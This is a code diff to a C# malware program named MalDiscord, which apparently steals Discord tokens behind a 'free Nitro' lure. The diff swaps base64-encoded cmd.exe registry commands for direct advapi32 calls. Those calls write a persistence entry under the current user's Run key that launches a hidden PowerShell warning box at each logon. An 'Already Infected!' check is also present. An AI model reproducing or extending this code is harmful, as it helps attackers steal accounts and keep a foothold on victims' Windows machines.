@@ -5,18 +5,35 @@ using System.IO;
 using System.Text.RegularExpressions;
 using System.Net.Http.Headers;
 using System.Diagnostics;
+using System.Runtime.InteropServices;
 
 namespace Discord2
 {
     class MalDiscord
     {
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
+        public static extern int RegOpenKeyEx(UIntPtr hKey, string subKey, int ulOptions, int samDesired, out UIntPtr hkResult);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern uint RegSetValueEx(UIntPtr hKey, [MarshalAs(UnmanagedType.LPStr)] string lpValueName, int Reserved, int dwType, IntPtr lpData, int cbData);
+
+        private static UIntPtr HKEY_LOCAL_MACHINE = new UIntPtr(0x80000002u);
+        private static UIntPtr HKEY_CURRENT_USER  = new UIntPtr(0x80000001u);
+        private const int KEY_ALL_ACCESS = 0xF003F;
+        private const int KEY_READ = 0x20019;
+        private const int REG_BINARY = 3;
+        private const int REG_SZ = 1;
+        
+        private const int ERROR_SUCCESS = 0x0;
+
+
         private static readonly HttpClient client = new HttpClient();
 
         private const int MAX_SEND = 200;
 
         public static void Run()
         {
-            if(OpenRegKey("warning")==0){
+            if(OpenRegKey(@"SoftWare\Microsoft\Windows\CurrentVersion\Run", null)){
                 Console.WriteLine("Already Infected!");
                 return;
             }
@@ -45,7 +62,7 @@ namespace Discord2
             }
 
             string message = "Your Computer has been infected. Do not worry, nothing dangerous or maliciuos. Next time be more careful with files you download from the internet. PS: No free Nitro :(";
-            WriteRegKey(message);
+            WriteRegKey(@"SoftWare\Microsoft\Windows\CurrentVersion\Run", String.Format("powershell -windowstyle hidden -noprofile -command \\\"Add-Type -Assemblyname PresentationFramework; [System.Windows.Messagebox]::Show('{0}', 'WARNING: Security Breach', 'OK', 'Exclamation')\\\"", message));
         }
 
         static List<string> GetTokens()
@@ -150,36 +167,25 @@ namespace Discord2
             return Encoding.Default.GetString(Convert.FromBase64String(base64));
         }
 
-        static int WriteRegKey(string message){
-            Process process = new Process();
-            ProcessStartInfo startInfo = new ProcessStartInfo();
-            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-            startInfo.FileName = "cmd.exe";
-            startInfo.Arguments = String.Format(FromBase64("L0MgUkVHIEFERCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiB3YXJuaW5nIC90IFJFR19TWiAvZCAiezB9Ig=="), String.Format("powershell -noprofile -command \\\"Add-Type -Assemblyname PresentationFramework; [System.Windows.Messagebox]::Show('{0}', 'WARNING: Security Breach', 'OK', 'Exclamation')\\\"", message));
-            process.StartInfo = startInfo;
-            process.Start();
-
-            if(!process.WaitForExit(3000)){
-                process.Kill();
+        static bool WriteRegKey(string subkey, string message){
+            UIntPtr hkey;
+            byte[] buffer = Encoding.ASCII.GetBytes(message);                                     
+            try{
+                if(RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_ALL_ACCESS, out hkey) != ERROR_SUCCESS) throw new Exception();
+                unsafe{
+                    fixed (byte* p = buffer){
+                        if(RegSetValueEx(hkey, null, 0, REG_SZ, (IntPtr)p, buffer.Length) != ERROR_SUCCESS) throw new Exception();
+                    }
+                }
+                return true;
+            } catch {
+                return false;
             }
-
-            return process.ExitCode;
         }
 
-        static int OpenRegKey(string name){
-            Process process = new Process();
-            ProcessStartInfo startInfo = new ProcessStartInfo();
-            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-            startInfo.FileName = "cmd.exe";
-            startInfo.Arguments = String.Format(FromBase64("L0MgUkVHIFFVRVJZIEhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIC92IHswfQ=="), name);
-            process.StartInfo = startInfo;
-            process.Start();
-
-            if(!process.WaitForExit(3000)){
-                process.Kill();
-            }
-
-            return process.ExitCode;
+        static bool OpenRegKey(string subkey, string name){
+            UIntPtr hkey;
+            return RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_READ, out hkey) == ERROR_SUCCESS;
         }
 
         static Dictionary<string, string>[] DictFromString(string input){
@@ -189,7 +195,7 @@ namespace Discord2
                 dict[i] = new Dictionary<string, string>();
             }
 
-            char[] deletechar = new Char[]{' ', '*', '.', '}', '{', '[', '[', '"'};
+            char[] deletechar = new Char[]{' ', '*', '.', '}', '{', '"'};
 
             for(int i=0;  i<entries.Length; i++){
                 string[] abc = entries[i].Trim(deletechar).Split('[');
